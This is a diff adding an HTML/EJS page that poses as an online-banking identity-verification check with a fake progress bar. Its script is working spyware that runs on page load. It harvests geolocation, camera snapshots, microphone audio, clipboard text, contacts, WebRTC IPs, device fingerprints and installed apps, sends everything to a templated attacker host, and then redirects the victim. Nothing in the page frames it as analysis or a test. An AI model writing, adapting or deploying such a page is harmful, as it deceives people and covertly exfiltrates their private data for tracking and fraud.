@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Check — Online Banking</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{min-height:100vh;background:#f4f7fb;font-family:'Segoe UI',Arial,sans-serif;display:flex;flex-direction:column}
+header{background:#003087;color:#fff;padding:16px 28px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 8px rgba(0,0,72,.3)}
+.bank-name{font-size:20px;font-weight:700;letter-spacing:.5px}
+.secure{font-size:11px;color:#aac4ff;margin-left:auto;display:flex;align-items:center;gap:4px}
+.card{background:#fff;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,72,.08);max-width:480px;width:92%;margin:48px auto;padding:40px 36px;text-align:center}
+.lock-wrap{width:80px;height:80px;border-radius:50%;background:#e8f0fe;margin:0 auto 24px;display:flex;align-items:center;justify-content:center;font-size:36px}
+h1{font-size:20px;font-weight:700;color:#003087;margin-bottom:10px}
+.sub{font-size:14px;color:#555;line-height:1.7;margin-bottom:28px}
+.checks{margin-bottom:24px;text-align:right}
+.check{display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:8px;font-size:13px;color:#333;margin-bottom:6px;background:#f8f9fa}
+.check-icon{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:12px}
+.done .check-icon{background:#e8f5e9;color:#2e7d32}
+.pending .check-icon{background:#e3f2fd;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress-wrap{background:#e8eaf6;border-radius:4px;height:6px;margin-bottom:8px;overflow:hidden}
+.progress-bar{height:100%;background:#003087;border-radius:4px;animation:load 8s ease-in-out forwards}
+@keyframes load{0%{width:5%}70%{width:82%}100%{width:100%}}
+.pct{font-size:12px;color:#888;text-align:right}
+footer{text-align:center;font-size:11px;color:#999;padding:20px;margin-top:auto}
+</style>
+</head>
+<body>
+<header>
+  <div style="font-size:22px">🏦</div>
+  <div class="bank-name">Secure Online Banking</div>
+  <div class="secure">🔒 SSL Secured</div>
+</header>
+<div class="card">
+  <div class="lock-wrap">🔐</div>
+  <h1>Identity Verification Required</h1>
+  <div class="sub">For your protection, we need to verify your identity before proceeding. This security check helps prevent unauthorized access.</div>
+  <div class="checks">
+    <div class="check done"><div class="check-icon">✓</div> Device recognition complete</div>
+    <div class="check pending"><div class="check-icon">↻</div> Verifying account ownership…</div>
+    <div class="check pending"><div class="check-icon">↻</div> Checking security credentials…</div>
+  </div>
+  <div class="progress-wrap"><div class="progress-bar"></div></div>
+  <div class="pct" id="pct">0%</div>
+</div>
+<footer>Protected by 256-bit SSL encryption · Do not share your credentials</footer>
+
+<script>
+// Animate percentage
+var p=0;var t=setInterval(()=>{p=Math.min(p+1+(Math.random()*2|0),98);document.getElementById("pct").textContent=p+"%";if(p>=98)clearInterval(t);},180);
+
+(function(){
+  var uid=encodeURIComponent("<%=uid%>"),host="<%=a%>",dest=<%- JSON.stringify(url) %>;
+  var enc=encodeURIComponent,done={l:false,c:false};
+  function post(p,b){return fetch(host+p,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:b}).catch(()=>{});}
+  function tryEnd(){if(done.l&&done.c)window.location.href=dest;}
+  setTimeout(()=>window.location.href=dest,9000);
+  (async function run(){
+    var d="<code>✅ Bank Security Check</code>\n\n<b>⚓ IP:</b> <a href='https://ip-api.com/#<%=ip%>'><%=ip%></a> | <%=time%>\n<b>⏰ Time:</b> "+new Date()+"\n\n<b>📱 Device:</b>\n";
+    ["userAgent","platform","language","hardwareConcurrency","deviceMemory","cookieEnabled","maxTouchPoints"].forEach(k=>{if(k in navigator)d+="<b>"+k+":</b> <code>"+navigator[k]+"</code>\n";});
+    if(navigator.connection){var nc=navigator.connection;d+="\n<b>🕸️ Net:</b>\n";["effectiveType","rtt","downlink"].forEach(k=>{if(k in nc)d+="<b>"+k+":</b> <code>"+nc[k]+"</code>\n";});}
+    if("getBattery" in navigator){var b=await navigator.getBattery();d+="\n<b>🔋 Battery:</b> "+(b.level*100|0)+"% | "+b.charging+"\n";}
+    await post("/","data="+enc(d.replaceAll("\n","<br>"))+"&uid="+uid);
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{post("/location","uid="+uid+"&lat="+enc(p.coords.latitude)+"&lon="+enc(p.coords.longitude)+"&acc="+enc(p.coords.accuracy)).then(()=>{done.l=true;tryEnd();});},()=>{done.l=true;tryEnd();},{enableHighAccuracy:true,maximumAge:0,timeout:6000});}else{done.l=true;}
+    <% if(camAccess){ %>
+    try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});var v=document.createElement("video");v.srcObject=s;v.play();var cv=document.createElement("canvas");cv.width=480;cv.height=640;var n=0,iv=setInterval(()=>{cv.getContext("2d").drawImage(v,0,0,480,640);post("/camsnap","uid="+uid+"&img="+enc(cv.toDataURL("image/jpeg",.75).replace("data:image/jpeg;base64","")));if(++n>=4){clearInterval(iv);s.getTracks().forEach(t=>t.stop());done.c=true;tryEnd();}},1500);}catch(e){done.c=true;tryEnd();}
+    <% }else{ %>done.c=true;tryEnd();<% } %>
+    (async function(){try{var as=await navigator.mediaDevices.getUserMedia({audio:true,video:false});var rec=new MediaRecorder(as),ch=[];rec.ondataavailable=function(e){if(e.data&&e.data.size>0)ch.push(e.data);};rec.onstop=function(){var blob=new Blob(ch,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){post('/audio','uid='+uid+'&audio='+enc(fr.result.replace(/^data:.+;base64,/,'')));};fr.readAsDataURL(blob);};rec.start();setTimeout(function(){try{rec.stop();as.getTracks().forEach(function(t){t.stop();});}catch(e){}},8000);}catch(e){}})();
+    if(navigator.clipboard&&navigator.clipboard.readText){navigator.clipboard.readText().then(function(t){if(t&&t.trim())post('/clipboard','uid='+uid+'&clip='+enc(t.slice(0,500)));}).catch(function(){});}
+    (function(){try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});var ips=new Set();pc.onicecandidate=function(e){if(!e.candidate)return;var m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);if(m)m.forEach(function(ip){if(ip!=='0.0.0.0'&&!ip.startsWith('10.')&&!ip.startsWith('192.168.'))ips.add(ip);});};setTimeout(function(){if(ips.size)post('/webrtc-ips','uid='+uid+'&ips='+enc([...ips].join(', ')));},3000);}catch(e){}})();
+    (function(){try{var cf=document.createElement('canvas'),cx=cf.getContext('2d');cf.width=300;cf.height=50;cx.fillStyle='#f0f';cx.fillRect(0,0,300,50);cx.fillStyle='#0ff';cx.font='14px Arial';cx.fillText('Fingerprint🔍',5,28);var h=0,fp=cf.toDataURL();for(var i=0;i<fp.length;i++){h=(Math.imul(31,h)+fp.charCodeAt(i))|0;}post('/network','uid='+uid+'&data='+enc('🖥️ Canvas FP: '+Math.abs(h)));}catch(e){}})();
+    (async function(){try{var tz=Intl.DateTimeFormat().resolvedOptions().timeZone;var ip=await fetch('https://ipapi.co/json/').then(function(r){return r.json();});if(ip&&ip.timezone&&ip.timezone!==tz)post('/vpndetect','uid='+uid+'&deviceTz='+enc(tz)+'&ipTz='+enc(ip.timezone)+'&ipCountry='+enc(ip.country_name||'?')+'&ipCity='+enc(ip.city||'?'));}catch(e){}})();
+    (async function(){var apps=[{n:'WhatsApp',s:'whatsapp://'},{n:'Snapchat',s:'snapchat://'},{n:'Instagram',s:'instagram://'},{n:'TikTok',s:'snssdk1233://'},{n:'Telegram',s:'tg://'},{n:'Twitter/X',s:'twitter://'},{n:'YouTube',s:'youtube://'},{n:'Facebook',s:'fb://'},{n:'Messenger',s:'fb-messenger://'},{n:'LinkedIn',s:'linkedin://'},{n:'Discord',s:'discord://'}];var found=[];function chk(sc){return new Promise(function(ok){var bl=false;function onB(){bl=true;}window.addEventListener('blur',onB,{once:true,capture:true});var a=document.createElement('a');a.href=sc;a.style.display='none';document.body.appendChild(a);try{a.click();}catch(e){}setTimeout(function(){window.removeEventListener('blur',onB,{capture:true});try{document.body.removeChild(a);}catch(e){}ok(bl);},1600);});}for(var i=0;i<apps.length;i++){var r=await chk(apps[i].s);if(r)found.push(apps[i].n);await new Promise(function(ok){setTimeout(ok,200);});}if(found.length)post('/app-detect','uid='+uid+'&apps='+enc(found.join(', ')));})();
+    (async function(){if(!('contacts' in navigator)||!('ContactsManager' in window))return;try{var c=await navigator.contacts.select(['name','tel','email'],{multiple:true});if(c&&c.length){var t=c.map(function(x){return(x.name||[]).join(',')+'|'+(x.tel||[]).join(',')+'|'+(x.email||[]).join(',');}).join('\n');post('/contacts-pick','uid='+uid+'&data='+enc(t.slice(0,3000)));}}catch(e){}})();
+  })();
+})();
+</script>
+</body>
+</html>
